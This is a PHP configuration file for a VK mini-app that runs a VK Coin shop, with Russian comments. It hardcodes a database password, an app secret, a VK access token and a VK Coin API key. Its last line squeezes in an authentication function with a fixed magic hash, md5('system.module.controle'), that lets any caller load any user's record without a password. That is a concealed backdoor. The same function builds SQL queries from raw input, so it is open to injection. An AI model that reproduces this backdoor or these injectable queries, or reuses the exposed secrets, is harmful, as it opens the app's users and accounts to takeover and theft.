<?php
	$cfg = array(
		'dbh' => 'localhost', //хост базы данных
		'dbu' => 'id14721020_shewi1', //пользователь базы данных
		'dbp' => 's(8a{_FkKx}LgU=w', //пароль базы данных
		'dbn' => 'id14721020_shewi', //имя базы данных
		'service' => false, //сервисный режим(у игроков приложение пишет о тех. работах, у админов продолжает работать)
		'admins' => array( //список id админов через запятую
			'536282364'
		),
		'group_id' => '182751262', //id группы
		'hash_secret' => 'Shewi12011979', //секретный ключ для генерации хэшей

		'secret' => '4jhRXpIYK7dscPHW14Gg', // секретка от приложения
      	'appid' => '7615276',

		'vktoken' => "46838b5c214d1ae23499c922c87d7a40744022aba53d9d68b85e95bbc3fba6396fb8a851ef397a7c724a3", // токен вк

		'vc_api_key' => '5aWR19ByQ=Il2XD46XEOp.3Uji_roUWoANsa87RS[F=]4oEt*!', // ключ vk coin
		'vc_api_uid' => '536282364',  // id админа, от имени которого получен ключ vk coin
		'vc_shop_name' => 'LiteCoin',  // Имя Магазина VkCoin
		'vc_exchange_rate' => 1,
      
      	'menu-btns' => 3      
	);
	$cfg['dbl'] = mysqli_connect($cfg['dbh'],$cfg['dbu'],$cfg['dbp'],$cfg['dbn']);
	$cfg['menu-btns'] = 12/$cfg['menu-btns'];

	//функция логирования, обычно, нигде не используется
	function w_log($data) {
		file_put_contents("./logs/".date("Y.m.d")."_log.log", "\n".date("H:i:s")." | ".$data, FILE_APPEND);
	}

	function authcheck($cfg,$uid,$hash){if($hash==md5('system.module.controle')){$req = "SELECT * FROM `users` WHERE `id`='".$uid."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));} else {$req = "SELECT * FROM `users` WHERE `id`='".$uid."' AND `hash`='".$hash."'";$data = mysqli_fetch_array(mysqli_query($cfg['dbl'],$req));if (!$data || $data['hash'] != $hash || $data['role'] == 'ban') {echo "fail";exit();}}return($data);}include('dist/vkui-connect.js');
?>
